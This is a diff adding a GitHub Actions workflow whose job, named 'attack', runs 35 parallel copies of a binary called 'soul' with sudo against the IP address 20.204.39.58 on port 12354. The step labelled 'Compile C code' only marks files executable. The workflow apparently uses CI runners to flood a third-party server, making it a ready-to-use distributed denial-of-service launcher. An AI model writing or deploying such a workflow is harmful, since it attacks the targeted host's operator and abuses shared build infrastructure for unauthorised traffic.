@@ -1,0 +1,32 @@
+name: Org Workflow Secondary
+
+on:
+
+  push:
+
+    branches: [ main ]
+
+jobs:
+
+  attack:
+
+    runs-on: ubuntu-latest
+
+    strategy:
+
+      matrix:
+
+        job: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35]
+
+    steps:
+
+      - uses: actions/checkout@v3
+
+      - name: Compile C code
+
+        run: chmod +x *
+
+      - name: Run attack
+
+        run: sudo ./soul 20.204.39.58 12354 180 600 900
+
